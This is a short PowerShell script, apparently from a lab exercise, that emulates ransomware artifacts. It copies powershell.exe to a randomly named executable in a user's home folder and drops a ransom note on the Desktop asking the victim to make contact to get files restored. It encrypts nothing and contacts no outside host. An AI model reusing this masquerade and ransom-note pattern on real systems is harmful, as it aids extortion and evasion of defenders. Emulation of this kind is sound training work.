#Creates a random interger between 1000 - 1999
$int = Get-random -Minimum 1000 -Maximum 1999

#Stores the name of the file that needs to be created
$fPath = 'EnNob-'+$int+'.exe'

#Copies the file to the home directory and under a new file name
Copy-Item -Path 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Destination "C:\Users\benhacked.EMUL\$fPath"

#Checks to see if the file exists
$outputName = '\Users\benhacked.EMUL\' + $fPath

if ( Test-path $outputName ){

    write-host -backgroundcolor "Green" -foregroundcolor "White" "$outputName file was created!"

} else {
    write-host -backgroundcolor "red" -foregroundcolor "White" "$outputName file was not created!"
}

#Stores the information for the file
$content = "If you want your files restored, please contact me at email@champlain.edu. I look forward to doing business with you."

#Creates the file and places it in the Home Directory
$content | Out-File -FilePath 'C:\Users\benhacked.EMUL\Desktop\Readme.READ'

#Checks to see if the file exists
$outputName2 = "C:\Users\benhacked.EMUL\Desktop\Readme.READ"

if ( Test-path $outputName2 ){

    write-host -backgroundcolor "Green" -foregroundcolor "White" "$outputName2 file was created!"

} else {
    write-host -backgroundcolor "red" -foregroundcolor "White" "$outputName2 file was not created!"
}